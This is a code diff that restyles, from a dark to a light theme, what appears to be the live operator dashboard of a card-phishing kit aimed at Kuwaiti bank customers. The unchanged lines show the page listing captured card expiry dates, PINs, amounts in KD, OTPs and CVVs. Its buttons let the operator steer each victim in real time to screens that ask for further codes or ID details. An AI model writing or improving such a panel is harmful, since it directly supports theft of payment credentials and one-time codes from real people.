@@ -7,63 +7,63 @@
     <script src="https://js.pusher.com/8.2.0/pusher.min.js"></script>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #1a1a2e; color: #eee; min-height: 100vh; }
+        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #f5f5f5; color: #333; min-height: 100vh; }
         
-        .header { background: #16213e; padding: 15px 30px; display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #e94560; }
+        .header { background: #ffffff; padding: 15px 30px; display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #e94560; box-shadow: 0 2px 4px rgba(0,0,0,0.05); }
         .header h1 { color: #e94560; font-size: 22px; }
         .header .status { display: flex; align-items: center; gap: 8px; }
-        .header .status .dot { width: 10px; height: 10px; border-radius: 50%; background: #00ff88; animation: pulse 2s infinite; }
+        .header .status .dot { width: 10px; height: 10px; border-radius: 50%; background: #28a745; animation: pulse 2s infinite; }
         @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
         
         .container { max-width: 1200px; margin: 20px auto; padding: 0 20px; }
         
         .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin-bottom: 25px; }
-        .stat-card { background: #16213e; border-radius: 10px; padding: 20px; text-align: center; border: 1px solid #0f3460; }
+        .stat-card { background: #ffffff; border-radius: 10px; padding: 20px; text-align: center; border: 1px solid #e0e0e0; box-shadow: 0 2px 4px rgba(0,0,0,0.05); }
         .stat-card .number { font-size: 36px; font-weight: bold; color: #e94560; }
-        .stat-card .label { color: #aaa; margin-top: 5px; }
+        .stat-card .label { color: #777; margin-top: 5px; }
         
-        .section { background: #16213e; border-radius: 10px; padding: 20px; margin-bottom: 20px; border: 1px solid #0f3460; }
-        .section h2 { color: #e94560; margin-bottom: 15px; font-size: 18px; border-bottom: 1px solid #0f3460; padding-bottom: 10px; }
+        .section { background: #ffffff; border-radius: 10px; padding: 20px; margin-bottom: 20px; border: 1px solid #e0e0e0; box-shadow: 0 2px 4px rgba(0,0,0,0.05); }
+        .section h2 { color: #e94560; margin-bottom: 15px; font-size: 18px; border-bottom: 1px solid #eee; padding-bottom: 10px; }
         
-        .submission-card { background: #0f3460; border-radius: 8px; padding: 15px; margin-bottom: 15px; border-left: 4px solid #e94560; }
-        .submission-card.active { border-left-color: #00ff88; }
+        .submission-card { background: #fafafa; border-radius: 8px; padding: 15px; margin-bottom: 15px; border-left: 4px solid #e94560; border: 1px solid #e0e0e0; }
+        .submission-card.active { border-left-color: #28a745; background: #fff; }
         .submission-card .info-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 10px; margin-bottom: 15px; }
-        .submission-card .info-item .label { color: #888; font-size: 12px; }
-        .submission-card .info-item .value { color: #fff; font-size: 14px; font-weight: bold; margin-top: 3px; }
+        .submission-card .info-item .label { color: #999; font-size: 12px; }
+        .submission-card .info-item .value { color: #333; font-size: 14px; font-weight: bold; margin-top: 3px; }
         
         .actions { display: flex; flex-wrap: wrap; gap: 8px; margin-top: 10px; }
         .btn { padding: 8px 16px; border: none; border-radius: 5px; cursor: pointer; font-size: 13px; font-weight: bold; transition: all 0.3s; }
-        .btn:hover { transform: translateY(-2px); box-shadow: 0 4px 12px rgba(0,0,0,0.3); }
-        .btn-accept { background: #00ff88; color: #000; }
-        .btn-otp { background: #ffa500; color: #000; }
-        .btn-cvv { background: #00bfff; color: #000; }
-        .btn-hawety { background: #ff69b4; color: #000; }
-        .btn-reject { background: #ff4444; color: #fff; }
-        .btn-error { background: #666; color: #fff; }
-        .btn-idpedol { background: #9b59b6; color: #fff; }
+        .btn:hover { transform: translateY(-2px); box-shadow: 0 4px 12px rgba(0,0,0,0.15); }
+        .btn-accept { background: #28a745; color: #fff; }
+        .btn-otp { background: #ffa500; color: #fff; }
+        .btn-cvv { background: #17a2b8; color: #fff; }
+        .btn-hawety { background: #e83e8c; color: #fff; }
+        .btn-reject { background: #dc3545; color: #fff; }
+        .btn-error { background: #6c757d; color: #fff; }
+        .btn-idpedol { background: #6f42c1; color: #fff; }
         .btn-clear { background: #e94560; color: #fff; padding: 10px 20px; }
         
         .status-badge { display: inline-block; padding: 3px 10px; border-radius: 12px; font-size: 11px; font-weight: bold; }
-        .status-pending { background: #ffa500; color: #000; }
-        .status-Accept { background: #00ff88; color: #000; }
-        .status-Reject { background: #ff4444; color: #fff; }
-        .status-cvv { background: #00bfff; color: #000; }
-        .status-otp { background: #ffa500; color: #000; }
-        .status-hawety { background: #ff69b4; color: #000; }
-        .status-error { background: #666; color: #fff; }
-        .status-idpedol { background: #9b59b6; color: #fff; }
+        .status-pending { background: #fff3cd; color: #856404; }
+        .status-Accept { background: #d4edda; color: #155724; }
+        .status-Reject { background: #f8d7da; color: #721c24; }
+        .status-cvv { background: #d1ecf1; color: #0c5460; }
+        .status-otp { background: #fff3cd; color: #856404; }
+        .status-hawety { background: #f8d7da; color: #721c24; }
+        .status-error { background: #e2e3e5; color: #383d41; }
+        .status-idpedol { background: #e8daef; color: #4a235a; }
         
-        .empty-state { text-align: center; padding: 40px; color: #666; }
+        .empty-state { text-align: center; padding: 40px; color: #999; }
         .empty-state .icon { font-size: 48px; margin-bottom: 10px; }
         
-        .log-entry { padding: 8px 12px; border-bottom: 1px solid #0f3460; font-size: 13px; display: flex; justify-content: space-between; }
-        .log-entry .time { color: #666; font-size: 11px; }
+        .log-entry { padding: 8px 12px; border-bottom: 1px solid #eee; font-size: 13px; display: flex; justify-content: space-between; }
+        .log-entry .time { color: #999; font-size: 11px; }
         
-        .notification { position: fixed; top: 20px; left: 50%; transform: translateX(-50%); background: #00ff88; color: #000; padding: 12px 24px; border-radius: 8px; font-weight: bold; z-index: 1000; display: none; animation: slideDown 0.3s; }
+        .notification { position: fixed; top: 20px; left: 50%; transform: translateX(-50%); background: #28a745; color: #fff; padding: 12px 24px; border-radius: 8px; font-weight: bold; z-index: 1000; display: none; animation: slideDown 0.3s; }
         @keyframes slideDown { from { top: -50px; opacity: 0; } to { top: 20px; opacity: 1; } }
         
-        .sound-btn { background: none; border: 1px solid #666; color: #666; padding: 5px 10px; border-radius: 5px; cursor: pointer; font-size: 12px; }
-        .sound-btn.active { border-color: #00ff88; color: #00ff88; }
+        .sound-btn { background: none; border: 1px solid #999; color: #666; padding: 5px 10px; border-radius: 5px; cursor: pointer; font-size: 12px; }
+        .sound-btn.active { border-color: #28a745; color: #28a745; }
     </style>
 </head>
 <body>
@@ -175,7 +175,7 @@
             list.innerHTML = submissions.slice().reverse().map(sub => `
                 <div class="submission-card ${sub.status === 'pending' ? 'active' : ''}">
                     <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:10px;">
-                        <span style="color:#888; font-size:12px;">#${sub.id} - ${new Date(sub.timestamp).toLocaleString('ar-EG')}</span>
+                        <span style="color:#999; font-size:12px;">#${sub.id} - ${new Date(sub.timestamp).toLocaleString('ar-EG')}</span>
                         <span class="status-badge status-${sub.status}">${getStatusLabel(sub.status)}</span>
                     </div>
                     <div class="info-grid">
@@ -185,8 +185,8 @@
                         <div class="info-item"><div class="label">تاريخ الانتهاء</div><div class="value">${sub.expMonth || '--'}/${sub.expYear || '--'}</div></div>
                         <div class="info-item"><div class="label">PIN</div><div class="value">${sub.pin || '-'}</div></div>
                         <div class="info-item"><div class="label">المبلغ</div><div class="value">${sub.amount || '-'} KD</div></div>
-                        ${sub.otp ? `<div class="info-item"><div class="label">OTP</div><div class="value" style="color:#ffa500;">${sub.otp}</div></div>` : ''}
-                        ${sub.cvv ? `<div class="info-item"><div class="label">CVV</div><div class="value" style="color:#00bfff;">${sub.cvv}</div></div>` : ''}
+                        ${sub.otp ? `<div class="info-item"><div class="label">OTP</div><div class="value" style="color:#e67e22;">${sub.otp}</div></div>` : ''}
+                        ${sub.cvv ? `<div class="info-item"><div class="label">CVV</div><div class="value" style="color:#17a2b8;">${sub.cvv}</div></div>` : ''}
                     </div>
                     ${sub.status === 'pending' ? `
                     <div class="actions">
